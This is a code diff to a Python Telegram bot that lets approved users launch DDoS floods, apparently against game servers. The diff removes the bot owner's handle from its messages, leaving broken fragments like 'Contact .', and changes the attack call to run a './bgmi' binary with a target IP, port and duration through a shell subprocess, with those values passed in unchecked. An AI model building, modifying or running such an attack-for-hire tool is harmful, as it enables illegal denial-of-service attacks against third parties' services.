@@ -47,7 +47,7 @@ async def help_command(update: Update, context: CallbackContext):
         "*⚠️ Important Notes:*\n"
         "*1. Only approved users can launch attacks.*\n"
         "*2. Use responsibly and with permission, DDoS attacks are illegal without consent.*\n"
-        "*3. Contact the bot owner @GODxAloneBOY for assistance or clarifications.*\n\n"
+        "*3. Contact the bot owner  for assistance or clarifications.*\n\n"
         "*⚡ Owner: *\n"
         "*📢 Channel: ()*"
     )
@@ -58,7 +58,7 @@ async def approve(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact @GODxAloneBOY.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact .*", parse_mode='Markdown')
         return
 
     if len(args) != 1:
@@ -75,7 +75,7 @@ async def remove(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact @GODxAloneBOY.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact number se.*", parse_mode='Markdown')
         return
 
     if len(args) != 1:
@@ -93,7 +93,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./ALONEPAPA {ip} {port} {time} 900",
+            f"./bgmi {ip} {port} {time} 350",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
